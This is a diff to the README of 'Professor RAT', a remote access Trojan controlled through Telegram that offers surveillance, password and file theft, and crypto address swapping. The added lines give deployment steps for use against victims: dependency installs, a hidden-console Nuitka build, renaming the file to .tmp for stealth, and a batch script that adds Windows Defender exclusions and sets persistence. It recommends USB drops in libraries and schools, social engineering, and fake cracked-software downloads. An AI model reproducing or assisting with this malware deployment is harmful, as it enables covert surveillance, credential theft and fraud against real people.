@@ -6,29 +6,82 @@ A comprehensive remote access toolkit with Telegram-based C&C (Command and Contr
 
 Professor RAT is a feature-rich remote access Trojan that provides complete surveillance and control over compromised systems. It offers real-time monitoring (camera, microphone, screen), data extraction (passwords, files, browsing history), system control (process management, remote commands), and financial tools (crypto address swapping). All commands are managed through a stealthy Telegram interface. 
 
-The toolkit supports two deployment approaches: **Quick Deployment** using batch scripts that require admin rights for full system access and automatic AV exclusion, or **Advanced Custom Deployment** where users compile modified, packed executables that bypass AV naturally and can be disguised as legitimate programs for stealthy distribution.
+The toolkit supports two deployment approaches: **Quick Deployment** using batch scripts that require admin rights for full system access and automatic AV exclusion, or **Advanced Custom Deployment** where users compile customized, packed executables that bypass AV naturally and can be disguised as legitimate programs for stealthy distribution.
 
 ## 🚀 Deployment Methods
 
 ### Method 1: Quick Deployment (Admin Required)
 ```
-system.tmp + deploy.bat 
+system.tmp + deploy.bat
+```
+<br>
+
+**Step 1: Install Required Dependencies**
+
+Open command prompt as administrator and run:
+
+```
+pip install requests pycryptodome opencv-python pillow pyperclip pynput sounddevice psutil win32crypt nuitka
 ```
 
-**How it works:**
-- Replace ```"TOKEN"``` & ```"ID``` with your actual Telegram Bot Token and ID
-- Compile `main.pyw` to `main.exe` using Nuitkita/Pyinstaller
-- Rename the file to any name and extension: `ren main.exe name.extension` (*Ex: game.data, update.jar, log.cache)*
-- Update the ```.bat``` file on ```line 16``` with your new file name
-- Add both files to the same folder
-- Run `deploy.bat` that runs as Administrator
-- Batch file automatically adds `main.exe` to Windows Defender exclusions
-- Creates persistence via scheduled tasks/registry
-- Executes `main.exe` with full system privileges
+If any module is missing, install it individually:
 
-**Perfect for:** USB drops on open vulnerable computers/laptops *(Ex: Library)* or social engineering attemps where you convince someone to run the ```.bat``` as admin.
+```
+pip install "module name"
+pip install requests  
+pip install pycryptodome
+```
+
+<br>
+
+**Step 2: Compile with Nuitka**
+
+Compile to create a standalone executable:
+
+```
+nuitka --onefile --follow-imports --windows-disable-console --include-package=requests --include-package=pycryptodome --include-package=cv2 --include-package=PIL --include-package=pyperclip --include-package=pynput --include-package=sounddevice --include-package=psutil --include-package=win32crypt main.pyw
+```
+
+This will create a `.exe` file without console window.
+
+<br>
+
+**Step 3: Rename File for Stealth**
+
+Rename the compiled file:
+
+```
+ren system.exe custom_name.tmp
+```
+
+*Renaming to `.tmp` makes it look less suspicious than a random `.exe` file*
+
+<br>
+
+**Step 4: Update Batch File**
+
+Update `deploy.bat` on line 16 with your new file name:
+
+```
+set "SOURCE_FILE=%~dp0custom_name.tmp"
+```
+
+<br>
+
+**Step 5: Deploy**
+
+Add both files to the same folder and run `deploy.bat` as Administrator
+
+- Batch file automatically adds your file to Windows Defender exclusions
+- Creates persistence via scheduled tasks/registry  
+- Executes your payload with full system privileges
+  
+**Perfect for:** USB drops on open vulnerable computers *(Ex: libraries, malls, schools)* or social engineering where you convince someone to run the `.bat` as admin.
+
+<br>
 
 ### Method 2: Advanced Custom Deployment
+
 ```
 custom_app.exe (Packed / Obfuscated)
 ```
@@ -40,7 +93,9 @@ custom_app.exe (Packed / Obfuscated)
 - Since your compiled executable bypasses antivirus, you can disguise it as any legitimate program
 - Then deploy your payload through any method - it appears as a clean, trusted file
 
-**Perfect for:** Fake software downloads (Ex: YouTube "cracked software" tutorials), email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.
+**Perfect for:** Fake software downloads *(Ex: YouTube "cracked software" tutorials)*, email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.
+
+<br>
 
 ## 🛠️ Features
 
